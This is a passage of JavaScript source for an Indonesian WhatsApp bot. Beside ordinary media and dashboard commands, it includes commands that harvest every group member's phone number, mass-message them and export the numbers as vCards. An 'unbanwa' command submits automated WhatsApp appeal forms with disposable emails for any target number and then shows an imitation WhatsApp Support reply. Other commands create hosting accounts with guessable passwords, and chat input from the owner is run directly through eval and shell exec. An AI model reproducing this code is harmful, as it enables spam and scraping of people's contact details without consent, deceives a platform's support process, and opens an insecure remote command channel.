} else if(isQuotedVideo || isVideo){
ehz.sendMessage(i,{contextInfo,video:fs.readFileSync(alala),caption:text})
} else if(isQuotedAudio){
ehz.sendMessage(i,{contextInfo,Audio:fs.readFileSync(alala)})
} else ehz.sendMessage(i,{contextInfo,text})
}
setReply(`Sukses Mengirim Broadcast Ke ${anus.length} Group`)
}
break
case "buatswimage":{
if (!isOwner) return setReply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
 if (!quoted) throw `Balas image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Balas image dengan caption *${prefix + command}*`
const media = await ehz.downloadAndSaveMediaMessage(quoted)
ehz.sendMessage('status@broadcast', { image: { url: media }}, {statusJidList: owner})
}
setReply(`*Sukses mengirim status whatsapp ke ${owner.length} Orang Yang Ada Di database*`)
break
case 'dashboard':{
const getFolderSize = (await import("get-folder-size")).default;
let storage = await getFolderSize.loose('.');
let moduls = await getFolderSize.loose('./node_modules');
let session = await getFolderSize.loose('./session')
let databse = await getFolderSize.strict('./database/database.json');
for (let i of hitnya){
let cekvipp = ms(i.expired - Date.now())
var resetnye = `${cekvipp.hours} jam ${cekvipp.minutes} menit`
}

let teks =`
––––––『 *Dashboard* 』––––––
⭔ *Runtime* : ${runtime(process.uptime())}
⭔ *Reset* : ${resetnye}
⭔ *Total Hit* : ${getHit("run", hitnya)}
⭔ *Storage* : ${FileSize(storage)}
⭔ *Modules* : ${FileSize(moduls)}
⭔ *Session* : ${FileSize(session)}
⭔ *Database* : ${FileSize(databse)}
`
let fall ="––––––『 *Commands Today* 』––––––\n"
let totalFail =[]
let totalSuc = []
let total = 0
let tot = 0
await dash.map(async function(e, i){
fall += " ⭔ "+` *${e.cmd}* : ${e.succes+e.failed} \n`
await totalFail.push(e.failed)
await totalSuc.push(e.succes)
});

for(let i = 0; i < totalFail.length; i++){
total += totalFail[i]
}

for(let a = 0; a < totalSuc.length; a++){
tot += totalSuc[a]
}

let akoh = `Total : ${dash.length} used`
let tod ="––––––『 *Commands Failed* 』––––––\n"
let filteredArray = await dash.filter(item => item.failed > 0 )
await filteredArray.map(async function(e, i){
tod += " ⭔ "+` *${e.cmd}* : ${e.failed} \n`

});
let aw = `Total : ${filteredArray.length} failed`
let tekz = teks+"\n\n"+fall+"\n"+akoh+"\n\n"+"––––––『 *Commands Status* 』––––––\n"+" ⭔ *Succes* : "+tot+"\n"+" ⭔ *Failed* : "+total+"\n\n"+tod+"\n\n"


let link = 'https://telegra.ph/file/b659d66189445cab43a25.jpg'
//conn.sendAdReply(from,tekz,copyright,baileysVersion,link,{quoted:m})
setReply(tekz)
}
break
        case 'join': {
          if (!m.text.includes('.')) return;
                if (!isOwner) return setReply()
                if (!q) return setReply('Masukkan Link Group!')
                setReply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await ehz.groupAcceptInvite(result).then((res) => setReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
        }
        break
case 'addvn': {
  if (!m.text.includes('.')) return;
                if (!isPremium) return setReply(mess.prem)
                if (args.length < 1) return setReply('Masukan Namanya?')
                if (VnEhanz.includes(q)) return setReply("Nama Telah Di Pakai")
                let delb = await ehz.downloadAndSaveMediaMessage(quoted)
                VnEhanz.push(q)
                await fsx.copy(delb, `./media/audio/${q}.mp3`)
                fs.writeFileSync('./src/media/vn.json', JSON.stringify(VnEhanz))
                fs.unlinkSync(delb)
                setReply(`Sukses Menambahkan Audio\nUntuk Mengecek Ketik ${prefix}listvn`)
            }
            break
case 'delvn': {
                if (!isPremium) return setReply(mess.prem)
                if (args.length < 1) return setReply('Masukan Namanya')
                if (!VnEhanz.includes(q)) return setReply("Nama Tidak Terdaftar Di Database")
                let wanu = VnEhanz.indexOf(q)
                VnEhanz.splice(wanu, 1)
                fs.writeFileSync('./src/media/vn.json', JSON.stringify(VnEhanz))
                fs.unlinkSync(`./media/audio/${q}.mp3`)
                setReply(`Sukses Menghapus Audio ${q}`)
            }
            break
case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VnEhanz) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VnEhanz.length}*`
                setReply(teks)
            }
            break
case 'addimage': {
                if (!isPremium) return setReply(mess.prem)
                if (args.length < 1) return setReply('Nama Imagenya?')
                if (ImageEhanz.includes(q)) return setReply("Nama Yang Kamu Masukan Sudah Terdaftar Di Dalam Database")
                let delb = await ehz.downloadAndSaveMediaMessage(quoted)
                ImageEhanz.push(q)
                await fsx.copy(delb, `./media/image/${q}.jpg`)
                fs.writeFileSync('./src/media/image.json', JSON.stringify(ImageEhanz))
                fs.unlinkSync(delb)
                setReply(`Sukses Menambahkan Image\nUntuk Cek Ketik ${prefix}listimage`)
            }
            break
case 'delimage': {
                if (!isPremium) return setReply(mess.prem)
                if (args.length < 1) return setReply('Masukan Nama Imagenya')
                if (!ImageEhanz.includes(q)) return setReply("Nama Image Yang Kamu Masukan Tidak Terdaftar")
                let wanu = ImageEhanz.indexOf(q)
                ImageEhanz.splice(wanu, 1)
                fs.writeFileSync('./src/media/image.json', JSON.stringify(ImageEhanz))
                fs.unlinkSync(`./media/image/${q}.jpg`)
                setReply(`Suksed Menghapus Image ${q}`)
            }
        break
case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of ImageEhanz) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${ImageEhanz.length}*`
                setReply(teks)
            }
            break
        case 'addvideo': {
                if (!isPremium) return setReply(mess.prem)
                if (args.length < 1) return setReply('Nama Videonya?')
                if (VideoEhanz.includes(q)) return setReply("Nama Yang Kamu Masukan Sudah Ada")
                let delb = await ehz.downloadAndSaveMediaMessage(quoted)
                VideoEhanz.push(q)
                await fsx.copy(delb, `./media/video/${q}.mp4`)
                fs.writeFileSync('./src/media/video.json', JSON.stringify(VideoEhanz))
                fs.unlinkSync(delb)
                setReply(`Success Menambahkan Video\nUntuk Melihat Ketik ${prefix}listvideo`)
            }
            break
case 'delvideo': {
                if (!isPremium) return setReply(mess.prem)
                if (args.length < 1) return setReply('Masukan Nama Video')
                if (!VideoEhanz.includes(q)) return setReply("Nama Tidak Ada Di Dalam Database")
                let wanu = VideoEhanz.indexOf(q)
                VideoEhanz.splice(wanu, 1)
                fs.writeFileSync('./src/media/video.json', JSON.stringify(VideoEhanz))
                fs.unlinkSync(`./media/video/${q}.mp4`)
                setReply(`Success Sukses Menghapus Video ${q}`)
            }
            break
case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of VideoEhanz) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoEhanz.length}*`
                setReply(teks)
            }
            break
        case 'addsticker': {
                if (!isPremium) return setReply(mess.prem)
                if (args.length < 1) return setReply('Masukan Nama Stickernya?')
                if (StickerEhanz.includes(q)) return setReply("Nama Telah Di Pakai")
                let delb = await ehz.downloadAndSaveMediaMessage(quoted)
                StickerEhanz.push(q)
                await fsx.copy(delb, `./media/sticker/${q}.webp`)
                fs.writeFileSync('./src/media/sticker.json', JSON.stringify(StickerEhanz))
                fs.unlinkSync(delb)
                setReply(`Sukses Menambahkan Sticker\nUntuk Mengecek Ketik ${prefix}liststicker`)
            }
            break
 case 'delsticker': {
                if (!isPremium) return setReply(mess.prem)
                if (args.length < 1) return setReply('Masukan Nama Stickernya')
                if (!StickerEhanz.includes(q)) return setReply("Nama Tidak Terdaftar Di Database")
                let wanu = StickerEhanz.indexOf(q)
                StickerEhanz.splice(wanu, 1)
                fs.writeFileSync('./src/media/sticker.json', JSON.stringify(StickerEhanz))
                fs.unlinkSync(`./media/sticker/${q}.webp`)
                setReply(`Sukses Menghapus Sticker ${q}`)
            }
            break
case 'liststicker': {
                let text = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of StickerEhanz) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerEhanz.length}*`
                setReply(text)
            }
            break
case "pushmemek":{
if (!isOwner && !isAdmins) return m.reply(mess.only.admin)
if (isGroup) return m.reply(mess.only.private)
if (!text) return m.reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik listgc`)
m.reply(mess.wait)
const groupMetadataa = !isGroup? await ehz.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await ehz.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await ehz.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(3000)
} else {
await ehz.sendMessage(mem, { text: global.tekspushkon })
await sleep(3000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
m.reply(util.format(err))
} finally {
await ehz.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break

case 'sendkontak': case 'kontak':{
if (!isOwner && !isAdmins) return m.reply(mess.only.admin)
if (!isGroup) return m.reply(mess.only.group)
if (!m.mentionedJid[0]) return m.reply('Ex; .kontak @tag|nama')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
ehz.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case "savecontactid": {
if (!isOwner && !isAdmins) return m.reply(mess.only.admin)
if (isGroup) return m.reply(mess.only.private)
if (!text) return m.reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik listgc`)
await m.reply(mess.wait)
const groupMetadataa = !isGroup? await ehz.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
(util.format(err))
} finally {
await ehz.sendMessage(from, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'adderror':
	{
	  if (!m.text.includes('.')) return;
	if (!q) return setReply(`Yang error apa bro ?\nContoh: ${prefix}adderror nosinya|menu`)
	if (!m.key.fromMe && !isOwner) return m.reply (mess.only.ownerB)
	let oke = q.split("|")[0]
	let oka = q.split("|")[1]
	addError(oke, oka, listerror)
	await setReply(`Sukses Menambahkan ${q} ke daftar error`)
	}
	break
 case 'clearerror':
	if (!isOwner) return onlyOwner()
	setReply("SukseS clear all error")
	clearAllError(listerror)
	break 
	
	case 'delerror':{
	if (!itsMe && !isOwner) return m.reply (mess.only.ownerB)
	listerror.splice(q, 1)
	fs.writeFileSync('./database/listerror.json', JSON.stringify(listerror))
	setReply( `Sukses menghapus ${q} di daftar error`)
	}
	break
	case "1gb": {
    if (!isOwner) return setReply("khusus owner")

let t = q.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "10"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await ehz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`DONE BY dycoders

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}
 *😎PEMILIK SERVER* : *"dycoders"*
 
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*WEB OWNER :*
https://lynk.id/Raffpanel

*GRUP OWNER :*
https://chat.whatsapp.com/IfvNK71eh5GIUJaW3TFa8W

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
ehz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: ehz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
© Cs RaffOffcial
`)

}

break
case "2gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await ehz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*WEB OWNER :*
https://lynk.id/Raffpanel

*GRUP OWNER :*
https://chat.whatsapp.com/IfvNK71eh5GIUJaW3TFa8W

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
ehz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: ehz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
	case 'listerror': {
	let errornye = `*List Error*\nJumlah : ${db.data.listerror.length}\n\n`
	for (let i of db.data.listerror){          
	errornye += `_*Command*_ : ${i.cmd}\n_*System Error*_ : ${i.error}\n\n*]─────────────────[*\n\n`             
	} 
	errornye += `© ${botName}`
	setReply(errornye)
	}
	break
case 'unbanwa': {
if (!isOwner && !isAdmins) return m.reply(mess.only.admin)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return m.reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Kepada team WhatsApp
Akun whatsapp teman saya terkena blokir dan terdeteksi spam,mohon pulihkan akun WhatsApp ini [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
m.reply(`Harap Bersabar Dan Tunggu 1-24 Jam Proses unbanned Menggunakan Bot \nDilarang Spam Unbanned Agar Akun WhatsApp Anda Tidak Terkena Banned Permanent!`)
m.reply(mess.wait)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses.
Anda dapat mengunjungi situs web kami untuk mengunduh WhatsApp atau aplikasi WhatsApp Business.
Anda dapat mempelajari selengkapnya mengenai cara menggunakan WhatsApp secara bertanggung jawab di artikel Pusat Bantuan ini.

Catatan: Kami tidak menyediakan dukungan untuk aplikasi, perangkat, atau versi WhatsApp yang tidak didukung, atau perangkat yang di-jailbreak atau di-root. Pelajari selengkapnya mengenai sistem operasi yang didukung di artikel ini. Untuk informasi selengkapnya mengenai aplikasi tidak resmi dan alasan kami tidak mendukung aplikasi tersebut, silakan baca artikel ini.

--
Tim Dukungan WhatsApp

Silakan kunjungi Pusat Bantuan kami.`)
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan nomor target!')
}
break

case 'public':
	if (!isOwner) return onlyOwner()
	if (publik) return setReply('Udah di mode publick kak')
	publik = true
	let bab =`Mode public aktif kak`
	setReply(bab)
	break
	case 'self':
	if (!isOwner) return onlyOwner()
	if (publik == false) return setReply('Udah di mode self kak')
	publik = false
	let breh =`Mode self aktif kak`
	setReply(breh)
	break

default:
//==============BATAS NYA==========//
//ketika ada yang invite/kirim link grup di chat pribadi
//Di kasih ama Alyul
if ((type === 'groupInviteMessage' || budy.includes('https://chat') || budy.includes('Buka tautan ini')) && !m.isBaileys && !isGroup && !itsMe && !isOwner) {
let teks = ('ngapain Kak Kirim Link Group,Jika Ingin Masukin Bot Ke Group Kaka Chat Owner Ku Terlebih Dahulu Ya Kak')      
m.reply (teks)
}
//Jika ada yg kirim pesan "Asalamualaikun" botz akan respon✓
if (budy.includes(`ualaikum`) || budy.includes(`u'alaikum`) ) { 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
setReply("Walaikumsalam kak")
}

if (budy.startsWith('=>')) {
if (!isOwner) return m.reply('*khusus Premium*')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isOwner) return m.reply('*khusus Premium*')
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
if (!isOwner) return m.reply('*khusus Premium*')
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
ehz.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
  }
 }
    } catch (err) {
        console.log("Eror Di Bagian dy.js "+util.format(err))
    }
}

//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.bgGreen(color("[  UPDATE ]", "black")),chalk.white(`${__filename}`) )
delete require.cache[file]
require(file)
  })
